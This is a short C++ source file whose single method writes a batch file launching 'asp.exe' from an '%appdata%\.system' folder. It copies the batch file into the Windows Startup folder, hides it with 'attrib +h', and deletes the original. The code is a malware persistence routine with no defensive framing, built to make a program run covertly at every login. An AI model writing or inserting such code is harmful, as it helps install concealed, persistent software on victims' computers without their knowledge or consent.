#include <iostream>
#include <fstream>
using namespace std;

class CreateBatFile {

    void MakeBat() {
        ofstream bat_file;
        bat_file.open("s.bat");
        bat_file << "@echo off\nc:\ncd %appdata%\\.system\\\nasp.exe";
        bat_file.close();
        system("COPY s.bat %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\s.bat");
        system("attrib +h \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s.bat\"");
        system("DEL s.bat");
    }
};
